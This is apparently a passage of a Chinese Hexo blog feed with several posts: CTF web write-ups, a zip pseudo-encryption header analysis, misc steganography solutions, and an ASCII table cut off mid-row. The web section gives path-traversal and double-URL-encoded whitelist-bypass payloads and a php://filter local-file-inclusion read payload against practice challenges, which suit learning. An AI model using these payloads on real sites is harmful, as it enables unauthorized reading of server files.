class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span> </code></pre><blockquote><p>代码的大致逻辑是让我们输入一个file参数，只要这个参数不为空、且为字符串类型、且能通过自定义的checkFile这个函数就能包含这个文件。</p><p>自定义的checkFile函数是一个类似白名单判断的函数，在白名单中包括两个文件名source.php和hint.php，然后会进行3次白名单判断，成功一次就算通过。</p><p>第一次判断，直接用输入的值来匹配白名单。</p><p>第二次判断，是取输入的第一个 <strong>？</strong>前面的字符串进行白名单判断。</p><p>第三次判断，是取输入的值进行URL编码的解码，然后和第二次判断一样，去解码后的字符串的第一个 <strong>？</strong>前面的内容进行白名单判断。</p></blockquote><p>首先看第一次判断，没有对值进行任何操作，所以不存在绕过的可能性，只能输入默认的两个白名单参数进行判断。</p><blockquote><p>在URL后输入 <strong>?file=source.php</strong>，页面又加载了一次source.php代码。</p><p>在URL后输入 <strong>?file=hint.php</strong>，页面加载了hint.php内容flag not here,and flag in ffffllllaaaagggg。大致可以看出我们的目标是绕过白名单，使页面能加载ffffllllaaaagggg文件。</p></blockquote><p>尝试在第二次判断中绕过，因为是取第一个 <strong>?</strong> 前面的字符串进行白名单判断，所以前面肯定是**?file=source.php<strong>或者</strong>?file=hint.php**，不然通不过白名单。但是我们可以再后面加上任何东西，因为他只取 <strong>?</strong> 前的进行判断，我们可以用 <strong>../</strong> 来跳出目录，找文件。</p><blockquote><p>输入**?file=hint.php?/../ffffllllaaaagggg<strong>，没有加载出来。<br>      输入</strong>?file=hint.php?/../../ffffllllaaaagggg<strong>，没有加载出来。<br>      输入</strong>?file=hint.php?/../../../ffffllllaaaagggg<strong>，没有加载出来。<br>      输入</strong>?file=hint.php?/../../../../ffffllllaaaagggg**，成功加载到页面，并看到flag。<br><img src="/posts/56672/7.png"></p></blockquote><p>尝试在第三次判断中绕过，因为和第二次判断相比，第三次判断前面的操作只是多了一次URL编码的解码，又因为本身浏览器解析的时候会进行URL的解码。所以我们需要对参数进行两次的URL编码。需要编码的其实也只有**?**这个字符。</p><blockquote><p><strong>?<strong>第一从URL编码为</strong>%3f</strong>，将**%<strong>再编码一次为</strong>%25<strong>。所以合起来?两次URL编码为</strong>%253f<strong>。将</strong>?<strong>替换成</strong>%253f<strong>，将</strong>?file=hint.php%253f/../../../../ffffllllaaaagggg**输入后也能加载到文件，得到flag。<br><img src="/posts/56672/8.png"></p></blockquote><h3 id="三、Havefun"><a href="#三、Havefun" class="headerlink" title="三、Havefun"></a>三、Havefun</h3><p>打开题目显示一个撸猫的也没啥也没有，啥也不是，我们选择查看源码，发现注释中存在PHP代码，审计发现代码逻辑是定义一个<strong>cat</strong>变量接受<strong>GET</strong>传参，如果变量值为<strong>dog</strong>就输出一个什么东西，我们尝试在URL中输入: <strong>?cat=dog</strong>得到flag。</p><p><img src="/posts/56672/10.png"></p><p><img src="/posts/56672/11.png"></p><h3 id="四、Include"><a href="#四、Include" class="headerlink" title="四、Include"></a>四、Include</h3><p>本题主要考察了利用php://filter伪协议进行文件包含。</p><p>打开后出现一个连接，点进去，发现URL中存在文件包含。</p><p><img src="/posts/56672/12.png"></p><p><img src="/posts/56672/13.png"></p><p>首先考虑 “php://input” 伪协议 + POST发送PHP代码的经典套路，发现题目直接过滤了php://input伪协议。</p><p><img src="/posts/56672/14.png"></p><p>重新考虑使用 “php://filter” 伪协议来进行包含。当他与包含函数结合时，php://filter流会被当做PHP文件执行，所以我们一般对其进行编码，组织其不执行，从而导致任意文件读取。</p><p>构造payload: <strong>?file=php://filter/read=convert.base64-encode/resource=flag.php</strong> 需要注意的是使用php://filter伪协议进行文件包含时，需要加上 <strong>read=convert.base64-encode</strong> 来对文件内容进行编码。发送请求得到base64编码后的flag.php文件源码。</p><p><img src="/posts/56672/15.png"></p><p>编码写入notepad++进行base64解码得到flag。</p><p><img src="/posts/56672/16.png"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip伪加密</title>
      <link href="/posts/45376/"/>
      <url>/posts/45376/</url>
      
        <content type="html"><![CDATA[<h2 id="zip文件格式分析"><a href="#zip文件格式分析" class="headerlink" title="zip文件格式分析"></a>zip文件格式分析</h2><h3 id="格式说明"><a href="#格式说明" class="headerlink" title="格式说明"></a>格式说明</h3><h4 id="官方文档zip格式"><a href="#官方文档zip格式" class="headerlink" title="官方文档zip格式"></a>官方文档zip格式</h4><pre class="language-none"><code class="language-none">Overall .ZIP file format:  [local file header 1]  [file data 1]  [data descriptor 1]  .   .  .  [local file header n]  [file data n]  [data descriptor n]  [archive decryption header] (EFS)  [archive extra data record] (EFS)  [central directory]  [zip64 end of central directory record]  [zip64 end of central directory locator]   [end of central directory record]</code></pre><h4 id="通常情况下zip格式"><a href="#通常情况下zip格式" class="headerlink" title="通常情况下zip格式"></a>通常情况下zip格式</h4><pre class="language-none"><code class="language-none">[local file header + file data + data descriptor]{1,n} + central directory + end of central directory record[文件头+文件数据+数据描述符]{此处可重复n次}+核心目录+目录结束标识当压缩包中有多个文件时，就会有多个[文件头+文件数据+数据描述符]</code></pre><h4 id="各个区的头部标志"><a href="#各个区的头部标志" class="headerlink" title="各个区的头部标志"></a>各个区的头部标志</h4><pre class="language-none"><code class="language-none">压缩源文件数据区: 50 4B 03 04压缩源文件目录区: 50 4B 01 02压缩源文件目录结束标志: 50 4B 05 06</code></pre><h2 id="举例分析"><a href="#举例分析" class="headerlink" title="举例分析"></a>举例分析</h2><p>场景：新建一个名为test.txt的文本文件，向其中写入123456作为内容，将test.txt压缩为test.zip文件，用winhex打开。（winhex以小端模式显示数据）</p><p><img src="/posts/45376/1.png"></p><table><thead><tr><th align="center">Offset</th><th align="center">Bytes</th><th align="center">Contents</th><th align="center">Descriptor</th></tr></thead><tbody><tr><td align="center">LOCAL FILE HEADER</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">00000000</td><td align="center">4</td><td align="center">50 4B 03 04</td><td align="center">文件头标识</td></tr><tr><td align="center">00000004</td><td align="center">2</td><td align="center">0A 00</td><td align="center">解压文件所需pkware最低版本</td></tr><tr><td align="center">00000006</td><td align="center">2</td><td align="center">00 00</td><td align="center">通用比特标志位</td></tr><tr><td align="center">00000008</td><td align="center">2</td><td align="center">00 00</td><td align="center">压缩方式</td></tr><tr><td align="center">0000000A</td><td align="center">2</td><td align="center">D1 69</td><td align="center">文件最后修改时间</td></tr><tr><td align="center">0000000C</td><td align="center">2</td><td align="center">67 54</td><td align="center">文件最后修改日期</td></tr><tr><td align="center">0000000E</td><td align="center">4</td><td align="center">61 D3 72 09</td><td align="center">CRC-32校验码</td></tr><tr><td align="center">00000012</td><td align="center">4</td><td align="center">06 00 00 00</td><td align="center">压缩后的大小</td></tr><tr><td align="center">00000016</td><td align="center">4</td><td align="center">06 00 00 00</td><td align="center">未压缩的大小</td></tr><tr><td align="center">0000001A</td><td align="center">2</td><td align="center">08 00</td><td align="center">文件名长度</td></tr><tr><td align="center">0000001C</td><td align="center">2</td><td align="center">00 00</td><td align="center">扩展区长度</td></tr><tr><td align="center">0000001E</td><td align="center">8</td><td align="center">74 65 73 74 2E 74 78 74</td><td align="center">文件名test.txt</td></tr><tr><td align="center">FILE DATA</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">00000026</td><td align="center">8</td><td align="center">74 31 32 33 34 35 36 50</td><td align="center">压缩文件数据，此处为文本文件test.txt压缩后的数据</td></tr><tr><td align="center">Central Directory Header</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">0000002C</td><td align="center">4</td><td align="center">50 4B 01 02</td><td align="center">核心目录文件header标识</td></tr><tr><td align="center">00000030</td><td align="center">2</td><td align="center">3F 00</td><td align="center">压缩所用的pkware版本</td></tr><tr><td align="center">00000032</td><td align="center">2</td><td align="center">0A 00</td><td align="center">解压所需pkware的最低版本</td></tr><tr><td align="center">00000034</td><td align="center">2</td><td align="center">00 00</td><td align="center">通用标记位</td></tr><tr><td align="center">00000036</td><td align="center">2</td><td align="center">00 00</td><td align="center">压缩方法</td></tr><tr><td align="center">00000038</td><td align="center">2</td><td align="center">D1 69</td><td align="center">文件最后修改时间</td></tr><tr><td align="center">0000003A</td><td align="center">2</td><td align="center">67 54</td><td align="center">文件最后修改日期</td></tr><tr><td align="center">0000003C</td><td align="center">4</td><td align="center">61 D3 72 09</td><td align="center">CRC-32校验码</td></tr><tr><td align="center">00000040</td><td align="center">4</td><td align="center">06 00 00 00</td><td align="center">压缩后的大小</td></tr><tr><td align="center">00000044</td><td align="center">4</td><td align="center">06 00 00 00</td><td align="center">未压缩的大小</td></tr><tr><td align="center">00000048</td><td align="center">2</td><td align="center">08 00</td><td align="center">文件名长度</td></tr><tr><td align="center">0000004A</td><td align="center">2</td><td align="center">24 00</td><td align="center">扩展域长度</td></tr><tr><td align="center">0000004C</td><td align="center">2</td><td align="center">00 00</td><td align="center">文件注释长度</td></tr><tr><td align="center">0000004E</td><td align="center">2</td><td align="center">00 00</td><td align="center">文件开始位置的磁盘编号</td></tr><tr><td align="center">00000050</td><td align="center">2</td><td align="center">00 00</td><td align="center">内部文件属性</td></tr><tr><td align="center">00000052</td><td align="center">4</td><td align="center">20 00 00 00</td><td align="center">外部文件属性</td></tr><tr><td align="center">00000056</td><td align="center">4</td><td align="center">00 00 00 00</td><td align="center">本地文件header的相对位移</td></tr><tr><td align="center">0000005A</td><td align="center">8</td><td align="center">74 65 73 74 2E 74 78 74</td><td align="center">目录文件名</td></tr><tr><td align="center">End Of Central Directory Record</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">00000086</td><td align="center">4</td><td align="center">50 4B 05 06</td><td align="center">核心目录结束标记</td></tr><tr><td align="center">0000008A</td><td align="center">2</td><td align="center">00 00</td><td align="center">当前磁盘编号</td></tr><tr><td align="center">0000008C</td><td align="center">2</td><td align="center">00 00</td><td align="center">核心目录开始位置的磁盘编号</td></tr><tr><td align="center">0000008E</td><td align="center">2</td><td align="center">01 00</td><td align="center">该磁盘上所记录的核心目录数量</td></tr><tr><td align="center">00000090</td><td align="center">2</td><td align="center">01 00</td><td align="center">核心目录结构总数</td></tr><tr><td align="center">00000092</td><td align="center">4</td><td align="center">5A 00 00 00</td><td align="center">核心目录的大小</td></tr><tr><td align="center">00000096</td><td align="center">4</td><td align="center">2C 00 00 00</td><td align="center">核心目录开始位置相对于archive开始的位移</td></tr><tr><td align="center">0000009A</td><td align="center">2</td><td align="center">00 00</td><td align="center">注释长度</td></tr></tbody></table><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><h3 id="判断位置"><a href="#判断位置" class="headerlink" title="判断位置"></a>判断位置</h3><p>压缩源文件数据区<strong>50 4B 03 04</strong>后的<strong>3-4个字节</strong>的全局方式标记位。</p><p>压缩源文件目录区<strong>50 4B 01 02</strong>后的<strong>5-6个字节</strong>的全局方式标记位。</p><pre class="language-none"><code class="language-none">通常情况下判定方法：无加密：压缩源文件数据区的全局加密为 00 00且压缩源文件目录区的全局方式标记位为 00 00伪加密：压缩源文件数据区的全局加密为 00 00且压缩源文件目录区的全局方式标记位为 09 00真加密：压缩源文件数据区的全局加密为 09 00且压缩源文件目录区的全局方式标记位为 09 00</code></pre><h3 id="通过修改标记位实现伪加密"><a href="#通过修改标记位实现伪加密" class="headerlink" title="通过修改标记位实现伪加密"></a>通过修改标记位实现伪加密</h3><p>意外出现了！有一个标记位01 02和03 04后面都是09 00的文件在Ziperello中竟然可以无需密码直接查看文件，将其后的09 00都改为00 00后保存解压竟然可以无密码直接解压，而只修改01 02后的09 00打开后报错。</p><p>分析后我们得到结论，修改01 02后面的09 00可以实现伪加密，只不过这个伪加密在解压的时候被解压软件认为是伪加密，但是拖到暴力破解软件中便被检测出来。为了使伪加密更加逼真我们把01 02和03 04后面都修改为09 00，再用Ziperello暴力破解时无法查看内容，文件被认为是真加密。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zip伪加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc-1-10</title>
      <link href="/posts/57974/"/>
      <url>/posts/57974/</url>
      
        <content type="html"><![CDATA[<h3 id="一、金三胖"><a href="#一、金三胖" class="headerlink" title="一、金三胖"></a>一、金三胖</h3><p>解压压缩包得到一个GIF图片，发现部分帧存在某些信息，打开Stegsolve使用帧浏览器逐帧分离，有三帧存在flag信息，将三帧拼接得到flag: **flag{he11ohongke}**。</p><p><img src="/posts/57974/1.png" style="zoom: 67%;"><img src="/posts/57974/2.png" style="zoom: 67%;"><img src="/posts/57974/3.png" style="zoom: 67%;"></p><h3 id="二、二维码"><a href="#二、二维码" class="headerlink" title="二、二维码"></a>二、二维码</h3><p>加压压缩包得到一张二维码图片，用QRresearch扫描并没有得到我们想要的信息，将图片拖入winhex中分析。在其中搜索十六进制数值 50 4B发现存在zip压缩包。</p><p><img src="/posts/57974/4.png" style="zoom: 33%;"><img src="/posts/57974/5.png" style="zoom: 80%;"></p><p>我们用把图片发送到foremost分解得到一个加密的压缩包，查看标记位压缩包并不是伪加密，把压缩包用ARCHPR破解得到解压密码: 7639。解压后打开文本文件: CTF{vjpw_wnoei}。把CTF替换成flag就是flag。</p><h3 id="三、你竟然赶我走"><a href="#三、你竟然赶我走" class="headerlink" title="三、你竟然赶我走"></a>三、你竟然赶我走</h3><p>解压得到一张图片，直接拖进winhex中在最下方发现flag，或者直接在Stegsolve中打开，选择Analyse下的File Format也可直接得到flag。</p><p><img src="/posts/57974/6.png"><img src="/posts/57974/7.png" style="zoom: 67%;"></p><h3 id="四、N种方法解决"><a href="#四、N种方法解决" class="headerlink" title="四、N种方法解决"></a>四、N种方法解决</h3><p>解压后得到一个KEY.exe文件，直接拖到winhex中发现是base64编码的图片数据，直接用html的img标签包裹编码，用浏览器解码。</p><p><img src="/posts/57974/8.PNG"></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>png<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>用浏览器打开文件得到一张二维码，或者直接把base64编码输入到浏览器URL地址栏中回车可直接查看图片，或者用在线网站解码。扫描二维码得到: KEY{dca57f966e4e4e31fd5b15417da63269}，将KEY改为flag即可。</p><h3 id="五、大白"><a href="#五、大白" class="headerlink" title="五、大白"></a>五、大白</h3><p>解压得到一张图片，发现图片宽高并不正常，根据提示猜测可以直接修改图片高度显示完整图片，将图片拖入winhex中，将01 00 修改为02 A7，保存查看完整图片获得flag。</p><p><img src="/posts/57974/9.png" style="zoom:80%;"><img src="/posts/57974/10.png" style="zoom:80%;"><img src="/posts/57974/11.png" style="zoom:80%;"></p><h3 id="六、基础破解"><a href="#六、基础破解" class="headerlink" title="六、基础破解"></a>六、基础破解</h3><p>根据提示用ARCHPR进行4位数字的掩码爆破，得到压缩包密码2563，解压得到一串base64编码，在线解码得到flag: flag{70354300a5100ba78068805661b93a5c}。</p><h3 id="七、乌镇峰会种图"><a href="#七、乌镇峰会种图" class="headerlink" title="七、乌镇峰会种图"></a>七、乌镇峰会种图</h3><p>同上题你竟然赶我走直接将图片拖入winhex中或者用stegsolve打开分析可直接得到flag。</p><h3 id="八、文件中的秘密"><a href="#八、文件中的秘密" class="headerlink" title="八、文件中的秘密"></a>八、文件中的秘密</h3><p>直接右键属性查看exif属性，发现flag藏在备注中。</p><p><img src="/posts/57974/12.png"></p><h3 id="九、wireshark"><a href="#九、wireshark" class="headerlink" title="九、wireshark"></a>九、wireshark</h3><p><img src="/posts/57974/13.png"></p><p>根据提示直接在wireshark中过滤出POST包,获得flag。</p><pre class="language-none"><code class="language-none">http.request.method==POST</code></pre><p><img src="/posts/57974/14.png"></p><h3 id="十、LSB"><a href="#十、LSB" class="headerlink" title="十、LSB"></a>十、LSB</h3><p>用stegsolve打开图片，在Red plane 0、Green plane 0和Blue plane 0通道发现图片上方出现某些信息。</p><p><img src="/posts/57974/15.png" style="zoom:67%;"><img src="/posts/57974/16.png" style="zoom:67%;"><img src="/posts/57974/17.png" style="zoom:67%;"><img src="/posts/57974/18.png" style="zoom:67%;"></p><p>我们选用Analyse中的Data Extract调整RGB通道的plane为0，勾选LSB First，预览发现这是一张图片，于是我们Save Bin保存为flag.png，打开是一张二维码，扫码得到flag。</p><p><img src="/posts/57974/19.png"></p><p><img src="/posts/57974/20.png"><img src="/posts/57974/21.png" style="zoom: 67%;"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码</title>
      <link href="/posts/53099/"/>
      <url>/posts/53099/</url>
      
        <content type="html"><![CDATA[<h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><p>American Standard Code for Information Interchange：美国信息交换标准代码，基于拉丁字母的编码系统，主要用于显示现代英语和其他西欧语言。用指定的7位或者8位二进制数组和来表示128或者256种可能的字符，即用一个字节表示一个字符，目前共定义了128个字符。</p><p>标准ASCII码也叫基础ASCII码，使用7位二进制数（剩下的一位二进制为0）来表示所有的大小写字母，数字0到9，标点符号以及在美式英语中使用的特殊控制字符。根据字符能否显示在屏幕中分为可显示字符和不可显示字符。不可显示字符0~31及127是控制字符或通信专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BS（退格）、BEL（响铃）等；通信专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等。8、9、10、和13分别转换为退格、制表、换行和回车字符，它们并没有特定的图形显示，但会依不同的应用程序对文本显示产生不同影响。</p><p>32~126共95个字符（32是空格)。</p><p>33~47为标点符号、运算符。</p><p>48~57为0到9十个阿拉伯数字。</p><p>58~64为标点符号、运算符。</p><p>65~90为26个大写英文字母。</p><p>91~96为标点符号、运算符。</p><p>97~122为26个小写英文字母。</p><p>123~126为标点符号、运算符。</p><p>127为DEL（delete）删除。</p><p>在标准ASCII中，最高位（b7）用作奇偶校验位。奇校验：正确代码一个字节中1的个数必须是奇数，若非奇数，则在最高位b7添1；偶校验：正确代码一个字节中1的个数必须是偶数，若非偶数，则在最高位b7添1。</p><p>后128个称为扩展ASCII码。许多基于x86的系统都支持使用扩展ASCII。扩展ASCII允许将每个字符的第八位用于确定附加的128个特殊符号字符、外来语字母和图形符号。</p><h4 id="ASCII表："><a href="#ASCII表：" class="headerlink" title="ASCII表："></a>ASCII表：</h4><table><thead><tr><th>Bin(二进制)</th><th>Oct(八进制)</th><th>Dec(十进制)</th><th>Hex(十六进制)</th><th>缩写/字符</th><th>解释</th></tr></thead><tbody><tr><td>0000 0000</td><td>00</td><td>0</td><td>0x00</td><td>NUL(null)</td><td>空字符</td></tr><tr><td>0000 0001</td><td>01</td><td>1</td><td>0x01</td><td>SOH(start of headline)</td><td>标题开始</td></tr><tr><td>0000 0010</td><td>02</td><td>2</td><td>0x02</td><td>STX (start of text)</td><td>正文开始</td></tr><tr><td>0000 0011</td><td>03</td><td>3</td><td>0x03</td><td>ETX (end of text)</td><td>正文结束</td></tr><tr><td>0000 0100</td><td>04</td><td>4</td><td>0x04</td><td>EOT (end of transmission)</td><td>传输结束</td></tr><tr><td>0000 0101</td><td>05</td><td>5</td><td>0x05</td><td>ENQ (enquiry)</td><td>请求</td></tr><tr><td>0000 0110</td><td>06</td><td>6</td><td>0x06</td><td>ACK (acknowledge)</td><td>收到通知</td></tr><tr><td>0000 0111</td><td>07</td><td>7</td><td>0x07</td><td>BEL (bell)</td><td>响铃</td></tr><tr><td>0000 1000</td><td>010</td><td>8</td><td>0x08</td><td>BS (backspace)</td><td>退格</td></tr><tr><td>0000 1001</td><td>011</td><td>9</td><td>0x09</td><td>HT (horizontal tab)</td><td>水平制表符</td></tr><tr><td>0000 1010</td><td>012</td><td>10</td><td>0x0A</td><td>LF (NL line feed, new line)</td><td>换行键</td></tr><tr><td>0000 1011</td><td>013</td><td>11</td><td>0x0B</td><td>VT (vertical tab)</td><td>垂直制表符</td></tr><tr><td>0000 1100</td><td>014</td><td>12</td><td>0x0C</td><td>FF (NP form feed, new page)</td><td>换页键</td></tr><tr><td>0000 1101</td><td>015</td><td>13</td><td>0x0D</td><td>CR (carriage return)</td><td>回车键</td></tr><tr><td>0000 1110</td><td>016</td><td>14</td><td>0x0E</td><td>SO (shift out)</td><td>不用切换</td></tr><tr><td>0000 1111</td><td>017</td><td>15</td><td>0x0F</td><td>SI (shift in)</td><td>启用切换</td></tr><tr><td>0001 0000</td><td>020</td><td>16</td><td>0x10</td><td>DLE (data link escape)</td><td>数据链路转义</td></tr><tr><td>0001 0001</td><td>021</td><td>17</td><td>0x11</td><td>DC1 (device control 1)</td><td>设备控制1</td></tr><tr><td>0001 0010</td><td>022</td><td>18</td><td>0x12</td><td>DC2 (device control 2)</td><td>设备控制2</td></tr><tr><td>0001 0011</td><td>023</td><td>19</td><td>0x13</td><td>DC3 (device control 3)</td><td>设备控制3</td></tr><tr><td>0001 0100</td><td>024</td><td>20</td><td>0x14</td><td>DC4 (device control 4)</td><td>设备控制4</td></tr><tr><td>0001 0101</td><td>025</td><td>21</td><td>0x15</td><td>NAK (negative acknowledge)</td><td>拒绝接收</td></tr><tr><td>0001 0110</td><td>026</td><td>22</td><td>0x16</td><td>SYN (synchronous idle)</td><td>同步空闲</td></tr><tr><td>0001 0111</td><td>027</td><td>23</td><td>0x17</td><td>ETB (end of trans. block)</td><td>结束传输块</td></tr><tr><td>0001 1000</td><td>030</td><td>24</td><td>0x18</td><td>CAN (cancel)</td><td>取消</td></tr><tr><td>0001 1001</td><td>031</td><td>25</td><td>0x19</td><td>EM (end of medium)</td><td>媒介结束</td></tr><tr><td>0001 1010</td><td>032</td><td>26</td><td>0x1A</td><td>SUB (substitute)</td><td>代替</td></tr><tr><td>0001 1011</td><td>033</td><td>27</td><td>0x1B</td><td>ESC (escape)</td><td>换码(溢出)</td></tr><tr><td>0001 1100</td><td>034</td><td>28</td><td>0x1C</td><td>FS (file separator)</td><td>文件分隔符</td></tr><tr><td>0001 1101</td><td>035</td><td>29</td><td>0x1D</td><td>GS (group separator)</td><td>分组符</td></tr><tr><td>0001 1110</td><td>036</td><td>30</td><td>0x1E</td><td>RS (record separator)</td><td>记录分隔符</td></tr><tr><td>0001 1111</td><td>037</td><td>31</td><td>0x1F</td><td>US (unit separator)</td><td>单元分隔符</td></tr><tr><td>0010 0000</td><td>040</td><td>32</td><td>0x20</td><td>(space)</td><td>空格</td></tr><tr><td>0010 0001</td><td>041</td><td>33</td><td>0x21</td><td>!</td><td>叹号</td></tr><tr><td>0010 0010</td><td>042</td><td>34</td><td>0x22</td><td>“</td><td>双引号</td></tr><tr><td>0010 0011</td><td>043</td><td>35</td><td>0x23</td><td>#</td><td>井号</td></tr><tr><td>0010 0100</td><td>044</td><td>36</td><td>0x24</td><td>$</td><td>美元符</td></tr><tr><td>0010 0101</td><td>045</td><td>37</td><td>0x25</td><td>%</td><td>百分号</td></tr><tr><td>0010 0110</td><td>046</td><td>38</td><td>0x26</td><td>&amp;</td><td>和号</td></tr><tr><td>0010 0111</td><td>047</td><td>39</td><td>0x27</td><td>‘</td><td>闭单引号</td></tr><tr><td>0010 1000</td><td>050</td><td>40</td><td>0x28</td><td>(</td><td>开括号</td></tr><tr><td>0010 1001</td><td>051</td><td>41</td><td>0x29</td><td>)</td><td>闭括号</td></tr><tr><td>0010 